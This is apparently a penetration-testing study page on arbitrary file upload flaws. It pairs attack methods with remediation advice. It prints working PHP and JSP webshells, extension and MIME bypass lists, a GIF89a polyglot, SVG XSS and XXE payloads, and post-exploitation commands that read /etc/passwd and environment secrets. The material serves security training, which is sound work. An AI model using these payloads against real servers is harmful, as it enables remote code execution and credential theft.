Arbitrary File Upload

A critical vulnerability where a web application accepts and stores user-supplied files without proper validation, allowing attackers to upload malicious executables (webshells, backdoors) that lead to remote code execution.

Critical BSCP Intermediate

Real-World Analogy

Envelope Bypass

A building has a mail slot that says "Letters only." You carefully fold a remote-controlled robot into the shape of a standard envelope. Security checks pass it through because it looks like a letter. Once inside, the robot unfolds, extends its mechanical arms, and does exactly what you programmed it to do · accessing files, deleting documents, whatever you want. That's a malicious file upload. The application validated the outer appearance (the extension, the MIME type) but didn't verify the actual content. What looks innocent on the surface is dangerous once executed.

🎯 Day 3 · File Upload Testing

On Day 3, find every file upload in the application: profile picture, document upload, import, avatar. For each one, run through the bypass checklist systematically in Burp Repeater:

  1. Upload a legitimate file · confirm it works and find where it's stored.
  2. Try shell.php · blocked? What error do you get?
  3. If blocked by extension: try shell.phtml, shell.php5, shell.PhP, shell.php.jpg
  4. If blocked by content-type: change Content-Type: image/jpeg in Burp while keeping .php extension
  5. If both: try magic bytes trick · prepend GIF89a; to your PHP code
  6. If shell uploads: access via URL, pass ?cmd=id, confirm RCE
# Minimal PHP webshell
<?php system($_GET['cmd']); ?>

# Access after upload:
https://target.com/uploads/shell.php?cmd=id
https://target.com/uploads/shell.php?cmd=cat+/etc/passwd

Chain it: File upload RCE → read app config → find DB credentials → full database dump. Or: upload HTML file → stored XSS in a viewer. Or: upload SVG → XXE injection.

How It Works

File upload vulnerabilities occur when servers accept and store user files without proper validation. The attack chain typically follows:

  1. Identify upload functionality. Find a feature that accepts files (profile picture, resume, document, etc.).
  2. Bypass validation checks. The server may check file extension, MIME type, or file contents. Attackers craft files that pass these checks.
  3. Upload malicious file. A PHP webshell, JSP backdoor, or other executable is stored on the server.
  4. Locate the file. The attacker determines where the file was stored (predictable upload directory, returned filename, etc.).
  5. Access and execute. Navigate to the file's URL in a browser or via direct HTTP request. The server executes the malicious code.
  6. Achieve remote code execution (RCE). With a webshell, the attacker can run arbitrary commands on the server.

Key requirement: The upload directory must be web-accessible (inside the webroot) AND the file type must be executable by the server (PHP, JSP, SHTML, etc.).

Where to Look

File upload features appear in many contexts:

  • Profile/avatar upload: User profile pictures, cover photos.
  • Document submission: Resume uploads, assignment submission, invoice upload.
  • Import functionality: "Import CSV," "Import spreadsheet," "Bulk upload."
  • Logo/branding: Company logo, product thumbnail.
  • Media galleries: Photo/video sharing, portfolio upload.
  • Email attachments: If the application processes uploaded email files.

Critical questions to ask:

  • Is the upload directory inside the webroot (accessible via HTTP)?
  • Is the filename preserved or randomized?
  • Can I access the uploaded file via a direct URL?
  • What file types does the server execute (PHP, JSP, SHTML, ASP)?

Burp Suite Workflow

1
Upload a legitimate file. Use a normal image or document (JPEG, PDF, etc.). Intercept the request in Burp Proxy to observe the upload mechanism.

...

------...
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

[binary JPEG data]
2
Note the response and file location. Observe where the file is stored. The response might include a path like /uploads/photo.jpg or /assets/user_123/photo.jpg.
3
Modify the filename to .php. In Burp Repeater, change the filename to shell.php. Keep the file content and MIME type the same initially. 
filename="shell.php"
Content-Type: image/jpeg

[binary JPEG data]
4
Also spoof the MIME type. Change Content-Type to image/jpeg even though it's a PHP file. This tricks basic validation. 
filename="shell.php"
Content-Type: image/jpeg
5
Replace the file content with a webshell. Use the PHP webshell payload: 
<?php system($_GET['cmd']); ?>
Send the request and observe if it's accepted.
6
Access the uploaded file. Visit the URL where the file was stored: http://target.com/uploads/shell.php. If successful, you should reach the webshell. Test it with a parameter: ?cmd=id.
7
If .php is blocked, try alternatives. Try extensions like .php5, .phtml, .shtml, or .php.jpg. Repeat steps 3-6 for each.

Payloads & Techniques

Basic PHP Webshell

The simplest webshell · accepts a cmd parameter and executes system commands:

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Usage: http://target.com/shell.php?cmd=whoami

One-Liner PHP Webshell

Minimal footprint, commonly used in CTFs and real attacks:

<?php system($_REQUEST['c']); ?>

Usage: ?c=id or POST with parameter c.

JSP Webshell (Java Servers)

For servers running Tomcat, JBoss, or other Java application servers:

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>

File Extension Bypass Techniques

shell.php         (basic)
shell.php5        (older PHP installations)
shell.php3        (legacy)
shell.phtml       (Apache + PHP)
shell.shtml       (Server-Side Includes)
shell.phps        (if .phps is executable)
shell.php.jpg     (null byte or filter confusion)
shell.jpg.php     (server-side processing order)
shell.jpg%00.php  (null byte in older systems)
shell.Php         (case variation)
shell.pHp         (case variation)
shell.php....    (trailing dots, Windows behavior)

MIME Type Spoofing

Modify the Content-Type header to bypass validation:

Original:
Content-Type: application/x-php

Spoofed as image:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

Polyglot Files (Valid Image + PHP Code)

Create a file that is both a valid image and executable PHP:

GIF89a;
<?php system($_GET['cmd']); ?>

Many applications check the magic bytes (GIF89a) and think it's safe. But PHP still executes the code.

SVG with XSS (for Client-Side Exploitation)

If the server returns SVG files with Content-Type: image/svg+xml, browsers execute embedded JavaScript:

<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
</svg>

XXE via SVG/XLSX

If the application processes XML-based formats (SVG, XLSX), inject XXE payloads to read local files:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>

WAF Bypass Techniques

Magic Bytes Trick

Prepend file magic bytes to make a PHP file look like an image:

GIF89a<?php system($_GET['cmd']); ?>

The server reads the first bytes (GIF89a) and thinks it's safe. PHP execution may still occur depending on Apache configuration.

Case Variation

Try different case combinations if extension checking is case-sensitive:

shell.php
shell.PhP
shell.pHp
shell.PHP
shell.Php

Alternate PHP Extensions

.php       (standard)
.php3      (legacy)
.php4      (legacy)
.php5      (common alternate)
.php7      (older systems)
.phtml     (Apache + PHP)
.phar      (PHP archive)
.shtml     (Server-Side Includes)
.pht       (some configs)
.inc       (if processed as PHP)

Null Byte Injection (Legacy Systems)

On older systems with PHP < 5.3.4, null bytes truncate the filename:

shell.php%00.jpg  →  shell.php (null byte terminates string)

Zip Slip (Archive Extraction)

If the application extracts uploaded ZIP files, craft a malicious archive with path traversal:

zip file structure:
../../../var/www/html/shell.php

When extracted, the file overwrites files outside the intended directory.

Content-Type Confusion

Some servers mishandle content types:

Claim image/jpeg but upload PHP
Use application/x-php with image extension
Use multipart/form-data with misleading headers

Exploitation & Impact

Remote Code Execution (RCE)

Impact: Critical. With a webshell, attackers execute arbitrary commands on the server:

?cmd=whoami              (identify user)
?cmd=id                  (see groups and permissions)
?cmd=cat /etc/passwd     (read user accounts)
?cmd=env                 (read environment variables with secrets)
?cmd=ls -la /home        (enumerate directories)

Information Disclosure

Impact: High. Read sensitive files from the compromised server:

  • Application source code to find other vulnerabilities.
  • Config files (.env, database.yml) containing credentials and API keys.
  • SSH private keys (~/.ssh/id_rsa) for lateral movement.
  • Application secrets (JWT keys, encryption keys).

Lateral Movement

Impact: High. Use the compromised server as a pivot point:

  • Install reverse shell for interactive access.
  • Enumerate internal network for other vulnerable systems.
  • Access internal databases or APIs not exposed externally.
  • Steal credentials to move laterally to other systems.

Backdoor Installation

Impact: Critical. Establish persistent access for long-term exploitation:

  • Create new user accounts with administrative privileges.
  • Install SSH backdoors or web-accessible shells.
  • Modify cron jobs to maintain access.
  • Even if the initial shell is found and deleted, backdoors remain.

Data Exfiltration

Impact: Critical. Extract sensitive data from the application:

  • Database credentials allow direct database access.
  • Customer data, financial records, personal information.
  • Source code for intellectual property theft.

Denial of Service

Impact: Medium. Damage the application or infrastructure:

  • Delete critical files or database records.
  • Consume resources to crash the service.
  • Defacement or unauthorized modifications.

Remediation

1. Whitelist Allowed File Extensions

Only allow explicitly approved file types:

const ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
const ext = filename.split('.').pop().toLowerCase();
if (!ALLOWED_EXTENSIONS.includes(ext)) {
  throw new Error('File type not allowed');
}

2. Validate File Magic Bytes (MIME Type)

Check the actual file content, not just the extension:

const fileType = require('file-type');
const type = await fileType.fromFile(uploadedPath);
const ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/gif'];
if (!ALLOWED_MIMES.includes(type.mime)) {
  throw new Error('Invalid file type');
}

3. Randomize Filenames

Don't preserve the user-supplied filename. Use UUIDs or hashed values:

const uuid = require('uuid');
const newFilename = uuid.v4() + '.jpg';  // Removes .php or other executables
fs.renameSync(uploadedPath, './uploads/' + newFilename);

4. Store Uploads Outside Webroot

Keep uploaded files outside the directory served by the web server:

/var/www/html/     (webroot  · files here are accessible via HTTP)
/var/uploads/      (outside webroot  · files NOT directly accessible)

If files must be served, use a download script that validates requests.

5. Use Cloud Storage or Blob Services

Store uploads in services like AWS S3, Google Cloud Storage, or Azure Blob Storage. These are not executable:

AWS S3: Files are served with Content-Type headers
  Content-Type: application/octet-stream  (forces download, not execution)

6. Disable Script Execution in Upload Directory

Configure the web server to reject execution in upload directories (Apache .htaccess):

<Files *>
  SetHandler default-handler
</Files>

php_flag engine off

7. Set Proper Content-Type Headers

Force browsers to download files instead of rendering them:

Content-Type: application/octet-stream
Content-Disposition: attachment; filename="file.pdf"

8. Implement Antivirus Scanning

Scan uploaded files with antivirus engines before storing them:

ClamAV (open-source antivirus)
YARA rules for detecting webshells
VirusTotal API integration

9. Log & Monitor Uploads

Alert on suspicious upload patterns:

  • Executable files attempted.
  • Large files from unusual users.
  • Repeated upload failures (sign of fuzz attacks).

10. Re-Validate on Download

Even if uploads are validated, re-check files before serving them:

async function serveFile(filename) {
  const actualMime = await detectMimeType(filename);
  const expectedMime = getMimeFromExtension(filename);
  if (actualMime !== expectedMime) {
    throw new Error('File type mismatch  · potential tampering');
  }
  return serveDownload(filename);
}

Common Beginner Mistakes

Only Trying .php Extension

Mistake: Testing .php, failing, and concluding the vulnerability doesn't exist. The server may be configured to execute .php5, .phtml, or .shtml but not .php. Fix: Try all alternative PHP extensions. Research the server's configuration if you can identify it (Apache vs IIS vs nginx, PHP version, etc.).

Not Checking If Files Are Web-Accessible

Mistake: Uploading a webshell but not being able to access it because it's stored outside the webroot or behind a download mechanism. Fix: First, upload a normal file and try to access it via a direct URL. If you can't reach it, the upload is less dangerous (unless there are other ways to trigger execution).

Forgetting to Test MIME Type Spoofing

Mistake: Assuming the server validates content when it only checks the Content-Type header. Fix: Always test spoofing the MIME type. Keep the malicious PHP content but claim it's an image with Content-Type: image/jpeg.

Client-Side Validation Only

Mistake: Seeing a JavaScript error that says "only images allowed" and assuming the check is enforced server-side. Fix: Intercept the upload in Burp and modify it regardless of client-side restrictions. Client-side validation is always bypassable.

Not Testing Polyglot Files

Mistake: Only testing extension/MIME tricks and missing polyglot files that combine image headers with executable code. Fix: Create a GIF89a + PHP file. Magic byte checks may pass while execution still occurs.

Ignoring the Uploaded File Path

Mistake: Not determining where the file was stored, making it impossible to access. Fix: Carefully observe the server's response. The response might include the file path, or you can infer it from common patterns (/uploads/, /assets/, /media/, etc.). Try common paths.

🔗 See Also · Attack Chains

File upload vulnerabilities open the door to many other attack classes depending on how files are processed.

📁 Path Traversal Use path traversal in the filename field to upload files outside the intended directory · e.g., overwrite web root files. ⚡ XSS Upload an SVG or HTML file with a script tag · if the server serves it with wrong content-type → stored XSS. 📄 XXE Upload a .docx, .xlsx, or SVG containing an XXE payload · the server-side parser processes the XML and fires the entity. ⏱️ Race Conditions Upload a malicious file and race to access it before antivirus/validation deletes it · the race condition window is your shell execution opportunity.
